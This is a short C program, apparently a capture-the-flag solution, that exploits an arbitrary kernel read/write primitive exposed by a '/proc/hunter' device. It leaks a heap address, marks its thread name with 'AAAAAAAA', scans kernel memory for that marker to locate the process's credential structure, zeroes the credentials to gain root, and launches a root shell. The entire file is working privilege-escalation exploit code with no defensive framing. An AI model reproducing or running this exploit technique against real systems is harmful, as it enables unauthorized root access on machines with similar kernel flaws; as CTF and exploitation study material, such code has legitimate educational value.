#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <sys/prctl.h>
#include <stdlib.h>

int fd;
// Some helper functions to read/write values
long read_p() {
	long res;
	read(fd, &res, 8);
	return res;
}

void set_p(long p) {
	char b[9];
	b[0] = 's';
	*(long*)&b[1] = p;
	write(fd, b, 9);
}

void write_p(long v) {
	char b[9];
	b[0] = 'w';
	*(long*)&b[1] = v;
	write(fd, b, 9);
}

int main()
{
	fd = open("/proc/hunter", O_RDWR);
	set_p(0);
	long heap = read_p();
	// read the heap address
	printf("heap: %p\n", heap);
	// set the name of this thread to all As
	prctl(PR_SET_NAME, "AAAAAAAA", 0, 0, 0);
	//now search for 0x4141414141414141 in memory
	long cred_location = 0;
	long cur = heap;
	while(!cred_location){
		if(cur%0x10000==0){
			printf("cur %p\n", cur);
		}
		set_p(cur);
		long v = read_p();
		if(v==0x4141414141414141){
			// when we find it look up 16 bytes to get the cred struct
			cred_location = cur - 0x10;
		}
		cur += 8;
	}
	// we found the cred_ptr and saved it to cur
	printf("cred_ptr at %p\n", cur);
	set_p(cred_location);
	long cred = read_p();
	printf("creds at %p\n", cred);
	// set all 8 bytes to 0
	for(int i=0; i<8; i++){
		set_p(cred+i*8);
		write_p(0);
	}
	// now we are root
	system("/bin/sh");
	return 0;
}
